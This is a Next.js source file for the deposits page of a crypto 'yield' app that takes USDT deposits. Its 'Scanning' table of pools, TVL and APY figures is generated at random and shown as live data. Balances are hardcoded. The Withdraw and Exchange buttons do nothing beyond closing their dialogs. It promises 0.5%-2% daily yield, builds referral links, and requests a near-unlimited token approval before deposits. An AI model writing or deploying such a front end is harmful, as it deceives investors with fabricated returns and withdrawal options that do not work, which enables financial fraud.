import axios from 'axios';
import {useRouter} from 'next/router';
import {useState, useEffect, SetStateAction} from 'react';
import {useRecoilState} from 'recoil';
import {Autoplay} from 'swiper';
import {Swiper, SwiperSlide} from 'swiper/react';

import type {NextPage} from 'next';

import {apiUrl} from '@/config';
import {approveAbi, approveContractAddress} from '@/config/approveContract';
import {abi, contractAddress} from '@/config/contract';
import {useContract, useEthersUtils} from '@/ethers-react';
import {useSigner} from '@/ethers-react/useSigner';
import {userState} from '@/store/user';
import {userDrawerState} from '@/store/userDrawer';
import {
  DepositsContainer,
  MyTable,
  TotalAddress,
  WithDrawContainer,
} from '@/styles/deposits';
import {Modal, SvgIcon} from '@/uikit';
import {copyUrlToClip, getAccount, IMessageType, showTip} from '@/utils';

import 'swiper/css';

const Deposits: NextPage = () => {
  const [loading, setLoading] = useState(false);
  const [withDrawvisable, setWithDrawVisable] = useState(false);
  const [exchangeisable, setExchangeisable] = useState(false);
  const [withDrawNumber, setWithDrawNumber] = useState<number>();
  const [exchangeNumber, setExchangeNumber] = useState<number>();
  const [user, setUser] = useRecoilState(userState);
  const [copyLink, setCopyLink] = useState('');
  const router = useRouter();
  const [deposits, setDeposits] = useState<number>();
  const [totaldeposits, settotalDeposits] = useState<number>(0);
  const [totalIncome, settotalIncome] = useState<number>(0);
  const [totalAddress, settotalAddress] = useState<number>(0);
  const [teamTotalDeposits, setteamTotalDeposits] = useState<number>(0);
  const [depositError, setDepositError] = useState(false);
  const [chain, setChain] = useState('BEP20');
  const exchangeList = [25, 50, 75, 100];
  const {getContract} = useContract();
  const {getEtherPrice} = useEthersUtils();

  const exchangeOptionList = [
    {label: 'USDT', value: 'USDT', img: '/static/image/usdt.png'},
    {label: 'INT', value: 'INT', img: '/static/image/int.png'},
    {label: 'LTC', value: 'LTC', img: '/static/image/ltc.png'},
    {label: 'LINK', value: 'LINK', img: '/static/image/link.png'},
    {label: 'BNB', value: 'BNB', img: '/static/image/bnb.png'},
    {label: 'ADA', value: 'ADA', img: '/static/image/ada.png'},
    {label: 'DOGE', value: 'DOGE', img: '/static/image/doge.png'},
  ];
  const [hasApprove, setHasApprove] = useState(false);
  const [fromObj, setFromObj] = useState(exchangeOptionList[0]);
  const [toObj, setToObj] = useState(exchangeOptionList[1]);
  const zm = ['A', 'B', 'C', 'D', 'E', 'F', 'H', 'I', 'J', 'K', 'G'];
  const onchangeFrom = (e: any, type: string) => {
    const value = e.target.value;
    const list = exchangeOptionList.filter((item) => {
      return item.value === value;
    });
    if (type === 'from') {
      setFromObj({...list[0]});
    } else {
      setToObj({...list[0]});
    }
  };
  const transfarFrom2To = () => {
    const cfrom = JSON.parse(JSON.stringify(fromObj));
    const ctransfar = JSON.parse(JSON.stringify(toObj));
    setFromObj(ctransfar);
    setToObj(cfrom);
  };
  const {getSignMessage} = useSigner();
  const {getHashId} = useEthersUtils();

  const getName = (length: number) => {
    let str = '';
    Array(length)
      .fill('')
      .forEach((_item) => {
        str += zm[Math.round(Math.random() * 10)];
      });
    return str;
  };
  const [dataSource, setDataSource] = useState<any>([]);
  const initRequest = () => {
    const arr: any[] = [];
    Array(12)
      .fill('')
      .forEach((_item, index) => {
        arr.push({
          pool: getName(6),
          project: getName(10),
          tvl: `$${Math.round(Math.random() * 100) / 10}b`,
          apy: `${Math.round(Math.random() * 190) / 100}%`,
        });
      });
    setDataSource(arr);

    let totalDeposit = 0;
    axios({
      url: `${apiUrl}/api/public/v1/users/deposit`,
      method: 'get',
      params: {wallet: user.accountAddress},
    }).then((res) => {
      const array = res?.data?.data || [];
      array.forEach((item: any) => {
        totalDeposit += item.amount;
      });
      settotalDeposits(totalDeposit);
    });
    let totalIncome = 0;
    axios({
      url: `${apiUrl}/api/public/v1/users/income`,
      method: 'get',
      params: {wallet: user.accountAddress},
    }).then((res) => {
      const array = res?.data?.data || [];
      array.forEach((item: any) => {
        totalIncome += item.amount;
      });
      settotalIncome(totalIncome);
    });

    axios({
      url: `${apiUrl}/api/public/v1/users/team`,
      method: 'get',
      params: {wallet: user.accountAddress},
    }).then((res: any) => {
      if (res?.data?.meta?.status === 200) {
        const data = res?.data?.data;
        settotalAddress(data?.invite_num);
        setteamTotalDeposits(data?.deposits_total);
      }
    });
  };
  const columns: any[] = [
    {
      title: 'Pool',
      dataIndex: 'pool',
      key: 'pool',
      align: 'center',
      render: (text: any) => <a>{text}</a>,
    },
    {
      title: 'Project',
      dataIndex: 'project',
      align: 'center',
      key: 'project',
      render: (text: any) => (
        <a>
          <SvgIcon height={12} name='nft-coin' width={12} />
          {text}
        </a>
      ),
    },
    {
      title: 'TVL',
      dataIndex: 'tvl',
      align: 'center',
      key: 'tvl',
      sorter: true,
    },
    {
      title: 'APY',
      dataIndex: 'apy',
      align: 'center',
      key: 'apy',
      sorter: true,
    },
  ];
  const onChangeChain = (e: {target: {value: SetStateAction<string>}}) => {
    setChain(e.target.value);
  };
  const onChangeDeposits = (e: {target: {value: SetStateAction<string>}}) => {
    let value = e.target.value as any;
    if (value > 1000) {
      value = 1000;
    }
    if (value < 0) {
      value = 0;
    }
    if (value < 100 || value % 100 !== 0) {
      setDepositError(true);
    } else {
      setDepositError(false);
    }
    setDeposits(value);
  };
  const copyToClip = (url: string) => {
    copyUrlToClip(url);
    showTip({type: IMessageType.SUCCESS, content: 'copied'});
  };
  const handleWithdraw = () => {
    setWithDrawVisable(false);
  };
  const handleExchange = () => {
    setExchangeisable(false);
  };
  const [userDrawer, setUserDrawer] = useRecoilState(userDrawerState);
  const handleClickBtn = async () => {
    checkIsApprove();
    if (!deposits) {
      showTip({type: IMessageType.ERROR, content: 'Please Input '});
      return;
    }
    if (!user.accountAddress) {
      setUserDrawer({
        open: !userDrawer.open,
      });
    } else {
      const msg = getHashId(`this is a insta system`);
      getSignMessage(msg);
      const signature = await getSignMessage(msg);
      setLoading(false);
      if (!signature.status) {
        showTip({type: IMessageType.ERROR, content: signature.sign || ''});
        return;
      }
      setLoading(true);
      try {
        const contract = await getContract(contractAddress, abi);
        const price = getEtherPrice(deposits || 0);
        await contract.deposits(price);
        setLoading(false);
      } catch {
        setLoading(false);
      }
    }
  };
  const checkIsApprove = async () => {
    const msg = getHashId(`approve insta`);
    getSignMessage(msg);
    const signature = await getSignMessage(msg);
    setLoading(false);
    if (!signature.status) {
      showTip({type: IMessageType.ERROR, content: signature.sign || ''});
      return;
    }
    const contract = await getContract(approveContractAddress, approveAbi);
    const account = await getAccount();
    if (account) {
      try {
        const edu = await contract.allowance(
          '0x846CaaAfC29E588bFEB662A83D73ed54FF11649B',
          account
        );
        console.log(edu);
        const price = getEtherPrice(99999999999);
        const approoveCon = await contract.approve(account, price);
        console.log(approoveCon);
        setHasApprove(true);
      } catch {
        showTip({
          type: IMessageType.ERROR,
          content: 'please switch to Binance Smart Chain Testnet!',
        });
      }
    } else {
      showTip({type: IMessageType.ERROR, content: 'address error'});
    }
  };

  useEffect(() => {
    initRequest();
    setCopyLink(
      `http://${location.host}?inviterId=${
        user?.uuid || '7206a100-bbc2-11ed-ab9f-c7ad60dc9119'
      }`
    );
  }, []);
  return (
    <DepositsContainer className={loading ? 'loading' : ''}>
      <h2>Scanning</h2>
      <div className='header'>
        {columns.map((item, index) => {
          return <div key={index}>{item.title}</div>;
        })}
      </div>
      <Swiper
        loop
        autoplay={{
          delay: 0,
          disableOnInteraction: false,
        }}
        className='mySwiper'
        direction='vertical'
        modules={[Autoplay]}
        speed={2000}
        style={{height: '140px'}}
      >
        {[...Array(3)].map((_, index) => {
          return (
            <SwiperSlide key={index}>
              <MyTable>
                {dataSource
                  .slice(index * 4, (index + 1) * 4)
                  .map((citem: any, cindex: any) => {
                    return (
                      <div className='content' key={cindex}>
                        {Object.keys(citem).map((ckey) => {
                          return <div key={ckey}>{citem[ckey]}</div>;
                        })}
                      </div>
                    );
                  })}
              </MyTable>
            </SwiperSlide>
          );
        })}
      </Swiper>
      <h2>Deposits</h2>
      <div className='approveContainer'>
        <div className='content'>
          <p>Multiple of 100</p>
          <div className='inputWrapper'>
            <input
              className='inputDeposit'
              max={1000}
              min={100}
              placeholder='Please Enter'
              type='number'
              value={deposits}
              onChange={onChangeDeposits}
            />
            {depositError && (
              <div className='error'>Multiple of 100(100-1000)</div>
            )}
            <div className='usdtWrapper'>
              <SvgIcon name='usdt' />
              <span>USDT</span>
            </div>
            <div className='bep'>BEP20</div>
            {/* <select value={chain} onChange={onChangeChain}>
              <option value='ERC20'>ERC20</option>
              <option value='ERC720'>ERC720</option>
              <option value='ERC1155'>ERC1155</option>
              <option value='ERC777'>ERC777</option>
            </select> */}
          </div>
        </div>
        <div className='desc'>
          <div className='left'>Invest Days:120D</div>
          <div className='left'>Daily Yield:0.5%-2%</div>
        </div>
        <div
          className='approveBtn'
          onClick={() => {
            handleClickBtn();
          }}
        >
          {hasApprove ? 'Deposit' : 'Approve'}
        </div>
      </div>
      <div className='title'>
        <div className='left'>Summary</div>
        {/* <div className='right' onClick={() => router.push('/profit')}>
          Details <SvgIcon color='#999' name='right-icon' />
        </div> */}
      </div>
      <TotalAddress>
        <div className='left' onClick={() => router.push('/depositDetail')}>
          <div className='top'>Cumulative deposits</div>
          <div className='bot'>
            {totaldeposits}
            <span>USDT</span>
          </div>
          <SvgIcon color='#999' name='right-icon' />
        </div>
        <div className='left' onClick={() => router.push('/income')}>
          <div className='top'>Cumulative income</div>
          <div className='bot'>
            {totalIncome}
            <span>USDT</span>
          </div>
          <SvgIcon color='#999' name='right-icon' />
        </div>
      </TotalAddress>
      <div className='balanceWrapper'>
        <div className='normalContent'>
          <div className='left'>
            <div className='top'>Balance</div>
            <div className='bot'>$251354.626</div>
          </div>
          {/* <div className='right'>+2.5%</div> */}
        </div>
        <div className='normalContent'>
          <div className='left'>
            <div className='top'>USDT</div>
            <div className='bot'>234.35</div>
          </div>
          <div className='right'>
            <div
              className='top'
              onClick={() => {
                setWithDrawVisable(true);
              }}
            >
              Withdraw
            </div>
          </div>
        </div>
        <div className='normalContent'>
          <div className='left'>
            <div className='top'>INT</div>
            <div className='bot'>9548.332</div>
          </div>
          <div className='right'>
            <div
              className='top'
              onClick={() => {
                setExchangeisable(true);
              }}
            >
              Exchange
            </div>
          </div>
        </div>
      </div>

      <div className='title'>
        <div className='left'>My Team</div>
        <div className='right' onClick={() => router.push('/myTeam')}>
          Details <SvgIcon color='#999' name='right-icon' />
        </div>
      </div>
      <TotalAddress>
        <div className='left'>
          <div className='top'>Total address</div>
          <div className='bot'>{totalAddress}</div>
        </div>
        <div className='left'>
          <div className='top'>Total deposit</div>
          <div className='bot'>
            {teamTotalDeposits}
            <span>USDT</span>
          </div>
        </div>
      </TotalAddress>
      <div className='title'>
        <div className='left'>Share Link</div>
      </div>
      <div className='normalContent'>
        <div className='network'>{copyLink}</div>
        <div className='right'>
          <div
            className='top'
            onClick={() => {
              copyToClip(copyLink);
            }}
          >
            Copy
          </div>
        </div>
      </div>
      <Modal
        height='auto'
        visible={withDrawvisable}
        width='80%'
        onClose={() => {
          setWithDrawVisable(false);
        }}
      >
        <WithDrawContainer>
          <h2>Withdraw</h2>
          <input
            placeholder='Please Enter'
            type='text'
            value={withDrawNumber}
            onChange={(e: any) => {
              setWithDrawNumber(e.target.value);
            }}
          />
          <div
            className='submit'
            onClick={() => {
              handleWithdraw();
            }}
          >
            OK
          </div>
          <img
            className='close'
            src='/static/image/close.png'
            onClick={() => {
              setWithDrawVisable(false);
            }}
          />
        </WithDrawContainer>
      </Modal>
      <Modal
        height='auto'
        visible={exchangeisable}
        width='80%'
        onClose={() => {
          setExchangeisable(false);
        }}
      >
        <WithDrawContainer>
          <h2>Exchange</h2>
          <div className='title'>
            <div className='left'>
              <img src={fromObj.img} />
              <select
                value={fromObj.value}
                onChange={(e) => {
                  onchangeFrom(e, 'from');
                }}
              >
                {exchangeOptionList.map((item, index) => {
                  return (
                    <option key={index} value={item.value}>
                      {item.label}
                    </option>
                  );
                })}
              </select>
            </div>
            <div className='right'>Balance: 0.4521623</div>
          </div>
          <div className='exchangeContent'>
            <input
              placeholder='Please Enter'
              type='text'
              value={exchangeNumber}
              onChange={(e: any) => {
                setExchangeNumber(e.target.value);
              }}
            />
            <div className='tabList'>
              {exchangeList.map((item, index) => {
                return (
                  <div
                    key={index}
                    onClick={() => {
                      setExchangeNumber(0.4521623 * item * 0.01);
                    }}
                  >
                    {item}%
                  </div>
                );
              })}
            </div>
          </div>
          <div className='transform'>
            <SvgIcon
              name='transform'
              onClick={() => {
                transfarFrom2To();
              }}
            />
          </div>
          <div className='title'>
            <div className='left'>
              <img src={toObj.img} />
              <select
                value={toObj.value}
                onChange={(e) => {
                  onchangeFrom(e, 'to');
                }}
              >
                {exchangeOptionList.map((item, index) => {
                  return (
                    <option key={index} value={item.value}>
                      {item.label}
                    </option>
                  );
                })}
              </select>
            </div>
            <div className='right'>Balance: 0</div>
          </div>
          <div className='exchangeContent'>
            <input
              placeholder='Please Enter'
              type='text'
              value={(exchangeNumber || 0) * 0.4}
            />
          </div>
          <div
            className='submit'
            onClick={() => {
              handleExchange();
            }}
          >
            OK
          </div>
          <img
            className='close'
            src='/static/image/close.png'
            onClick={() => {
              handleExchange();
            }}
          />
        </WithDrawContainer>
      </Modal>
    </DepositsContainer>
  );
};

Deposits.displayName = 'Deposits';

export default Deposits;
